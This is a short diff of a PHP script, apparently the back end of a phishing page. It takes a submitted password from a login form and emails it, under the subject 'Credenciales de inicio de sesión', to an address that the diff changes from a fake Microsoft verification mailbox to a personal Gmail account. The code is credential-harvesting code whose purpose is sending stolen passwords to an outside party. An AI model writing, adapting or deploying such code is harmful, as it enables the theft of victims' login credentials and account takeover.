@@ -5,7 +5,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $contrasena = $_POST['contrasena'];
 
     // Correo de destino
-    $destinatario = "microsoft_verification@hotmail.com";
+    $destinatario = "cucapremium01@gmail.com.com";
 
     // Asunto del correo
     $asunto = "Credenciales de inicio de sesión";
